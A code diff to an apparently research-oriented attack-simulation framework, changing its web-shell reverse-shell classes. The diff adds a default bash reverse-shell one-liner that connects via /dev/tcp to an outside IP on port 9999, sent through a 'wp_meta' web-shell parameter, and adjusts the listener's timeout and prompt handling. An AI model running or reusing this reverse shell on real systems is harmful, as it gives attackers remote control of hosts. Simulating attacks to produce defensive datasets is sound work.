@@ -34,7 +34,6 @@ from cr_kyoushi.simulation.util import (
 from .context import Context
 from .expect import (
     BASH_PATTERN,
-    SH_PATTERN,
     SU_FAIL,
     SU_PASSWORD_PROMPT,
 )
@@ -590,7 +589,11 @@ class ExecWebShellCommand:
 class OpenReverseShell(ExecWebShellCommand):
     def __init__(
         self,
-        cmd: List[str],
+        cmd: List[str] = [
+            "bash",
+            "-c",
+            "'0<&196;exec 196<>/dev/tcp/192.42.2.185/9999; sh <&196 >&196 2>&196'",
+        ],
         cmd_param: str = "wp_meta",
         verify: bool = False,
         timeout: float = 25,
@@ -614,7 +617,7 @@ class OpenReverseShell(ExecWebShellCommand):
         log.info("Starting reverse shell")
         try:
             super().__call__(log, current_state, context, target)
-        except TimeoutError:
+        except (TimeoutError, requests.exceptions.ReadTimeout):
             log.info("Received request timeout")
 
 
@@ -735,7 +738,7 @@ class WaitReverseShellConnection:
 
     def __init__(
         self,
-        expect_after: Pattern = SH_PATTERN,
+        expect_after: Optional[Pattern] = None,
         encoding: str = "utf-8",
         timeout: int = 60 * 2,
     ):
@@ -745,7 +748,7 @@ class WaitReverseShellConnection:
             encoding: The encoding to use for sending and receiving
             timeout: Maximum time to wait for outputs
         """
-        self.expect_after: Pattern = expect_after
+        self.expect_after: Optional[Pattern] = expect_after
         self.encoding: str = encoding
         self.timeout: int = timeout
 
@@ -765,13 +768,17 @@ class WaitReverseShellConnection:
             log = log.bind(
                 listen_socket=sock.getsockname(), remote_socket=sock.getpeername()
             )
-            log.info("Waiting for prompt")
-            _receive(log, reverse_shell, self.expect_after, self.timeout, self.encoding)
+
+            if self.expect_after is not None:
+                log.info("Waiting for prompt")
+                _receive(
+                    log, reverse_shell, self.expect_after, self.timeout, self.encoding
+                )
             log.info("Reverse shell connected")
 
         else:
-            log.error("Failed to open PTY shell")
-            raise Exception("Shell is not connected")
+            log.error("Failed to wait for shell")
+            raise Exception("Listener socket is not present")
 
 
 def close_reverse_shell(
